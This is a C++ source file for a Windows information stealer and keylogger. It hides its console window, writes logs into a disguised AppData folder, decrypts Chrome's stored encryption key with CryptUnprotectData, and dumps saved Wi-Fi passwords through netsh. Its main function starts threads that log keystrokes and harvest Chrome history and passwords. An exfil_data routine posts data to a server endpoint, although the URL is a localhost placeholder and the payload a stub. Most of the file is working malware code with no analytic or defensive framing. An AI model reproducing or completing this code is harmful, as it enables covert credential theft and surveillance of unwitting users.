#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <sys/stat.h>
#include "sqlite/sqlite3.h"
#include <cstdlib>
#include <winsock.h>
#include <thread>
#include <ctime>
#include <chrono>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>
#include <Wincrypt.h>
#include <rapidjson/document.h>
#include <openssl/evp.h>
#include <wtypes.h>
#include <iomanip>
#include <vector>
#include <curl/curl.h>
#include "winmon.h"

using namespace std;
using namespace rapidjson;



string g_key_press_logfile;
string g_chrome_history_logfile;
string g_chrome_last_time_logfile;
string g_chrome_passwd_logfile;
string g_wifi_passwd_logfile;
string g_chrome_data_dir;

string g_last_history_time = "01-01-1970 00:00:00"; 
string g_hostname;
string g_username;
string g_local_key;


string exec(const char* cmd) {
    array<char, 1000> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


void printHexadecimal(const string& str) {
    for (char c : str)
    {
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (int)c << " ";
    }
    std::cout << std::endl;
}


void get_computer_stats() {
    long unsigned int hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    long unsigned int username_len = 257;
    char hostname[hostname_len];    
    char username[username_len];
    GetComputerNameExA((COMPUTER_NAME_FORMAT)0, hostname, &hostname_len);
    GetUserNameA(username, &username_len);
    g_hostname = string(hostname);
    g_username = string(username);
}


string base64_decode(string const& encoded_string)
{
    vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    string decoded_string;
    int val = 0, valb = -8;
    for (unsigned char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded_string.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded_string;
}


string decrypt_CryptUnprotectData(const string& encrypted_data) {
    DATA_BLOB encrypted_blob;
    encrypted_blob.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(encrypted_data.data()));
    encrypted_blob.cbData = encrypted_data.size();
    DATA_BLOB decrypted_blob;
    BOOL result = CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &decrypted_blob);

    if (!result) {
    // The function failed, check GetLastError() for more information
        cout << "CryptUnprotectData failed" << endl;
        throw std::runtime_error("CryptUnprotectData failed");
    } else {
    string decrypted_data(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
        // Free the memory allocated by CryptUnprotectData
        LocalFree(decrypted_blob.pbData);
        return decrypted_data;
    }
}


string get_local_key() {
    string key_path = g_chrome_data_dir + "Local State";
    ifstream file(key_path);
    string contents((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();

    Document d;
    d.Parse(contents.c_str());
    
    string encrypted_key = d["os_crypt"]["encrypted_key"].GetString();
    string decoded_encrypted_key = base64_decode(encrypted_key);
    decoded_encrypted_key.erase(0,5);
    string decrypted_data = decrypt_CryptUnprotectData(decoded_encrypted_key);
    return decrypted_data;
}


void setup_fs() {
    get_computer_stats();
    
    string log_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Windows\\";
    const char* path = log_dir.c_str();
    int retval = mkdir(path);

    g_key_press_logfile = log_dir + "key.log";
    g_chrome_history_logfile = log_dir + "chrome_history.log";
    g_chrome_last_time_logfile = log_dir + "chrome_last_time.log";
    g_chrome_passwd_logfile = log_dir + "chrome_passwords.log";
    g_wifi_passwd_logfile = log_dir + "wifi_passwords.log";
    g_chrome_data_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Google\\Chrome\\User Data\\";

    g_local_key = get_local_key();
}


// Set the base URL for the server
const std::string url = "http://localhost:3000/endpoint";

int exfil_data() {
  // Initialize the curl library
  curl_global_init(CURL_GLOBAL_ALL);

  // Create a curl handle
  CURL* curl = curl_easy_init();

  // Set the URL for the POST request
  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

  // Set the payload for the POST request
  const std::string payload = "{\"key\": \"value\"}";
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

  // Send the POST request
  CURLcode res = curl_easy_perform(curl);

  // Check for errors
  if (res != CURLE_OK) {
    std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
  } else {
    // Get the status code of the POST response
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    std::cout << "POST response status code: " << http_code << std::endl;
  }

  // Set the URL for the GET request
  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

  // Send the GET request
  res = curl_easy_perform(curl);

  // Check for errors
  if (res != CURLE_OK) {
    std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
  } else {
    // Get the status code of the GET response
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    std::cout << "GET response status code: " << http_code << std::endl;
  }

  // Clean up
  curl_easy_cleanup(curl);
  curl_global_cleanup();

  return 0;
}


void get_saved_ssids_and_passwords() {
    const char* get_all_profiles = "netsh wlan show profile | findstr /r /s /i /m /c:\"\\<Profile\\>\"";
    char *out = (char*)exec(get_all_profiles).c_str();
    stringstream ss(out);
    string to;
    if (out != NULL) {
        ofstream myfile;
        myfile.open(g_wifi_passwd_logfile, ios_base::app);
        while(std::getline(ss,to,'\n')){
            try {
                string ssid = to.substr(to.find(" : ")+3, to.length());
                string get_profile_password = "netsh wlan show profile name=\"" + ssid + "\" key=clear | findstr \"Content\"";
                string out2 = exec(get_profile_password.c_str());
                string passwd = out2.substr(out2.find(" : ")+3, out2.length());    
                string output = ssid + "\t\t" + passwd;
                myfile << output + "\n";
            } catch (...) {}          
        }

        myfile.close();

    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    setup_fs();
    //get_saved_ssids_and_passwords();
    thread th1(chrome_history_interval_check);
    thread th2(detect_key_press);
    thread th3(chrome_password_interval_check);
    th1.join();
    th2.join();
    th3.join();
    return 1;
}
